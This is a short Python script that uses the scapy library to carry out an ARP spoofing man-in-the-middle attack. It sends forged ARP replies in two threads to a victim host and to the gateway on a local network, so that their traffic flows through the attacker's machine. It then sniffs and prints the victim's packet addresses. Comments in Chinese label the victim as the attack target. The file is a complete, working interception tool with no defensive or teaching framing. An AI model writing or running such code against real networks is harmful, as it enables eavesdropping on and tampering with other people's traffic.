import threading

from scapy.layers import l2, inet
from scapy.sendrecv import sniff, srploop

mac_local = l2.Ether().src
print(mac_local)
ip_gateway = "192.168.1.1"  # 网关IP
mac_gateway = l2.getmacbyip(ip_gateway)
ip_victim = "192.168.1.100"  # 被攻击对象 IP
mac_victim = l2.getmacbyip(ip_victim)

p1_ether = l2.Ether(dst=mac_victim)
p1_arp = l2.ARP(op=2, psrc=ip_gateway, pdst=ip_victim, hwsrc=mac_local)
p2_ether = l2.Ether(dst=mac_gateway)
p2_arp = l2.ARP(op=2, psrc=ip_victim, pdst=ip_gateway, hwsrc=mac_local)


def send_to_victim():
    srploop(p1_ether / p1_arp, timeout=1, verbose=False)


def send_to_gateway():
    srploop(p2_ether / p2_arp, timeout=1, verbose=False)


def mitm_attack(p):
    try:
        if p[inet.IP].src == ip_victim or p[inet.IP].dst == ip_victim:
            print("src: %s, dst: %s" % (p[inet.IP].src, p[inet.IP].dst))
    except Exception:
        pass


threading.Thread(target=send_to_victim).start()
threading.Thread(target=send_to_gateway).start()
sniff(lfilter=lambda x: not x.haslayer(l2.ARP), prn=mitm_attack)
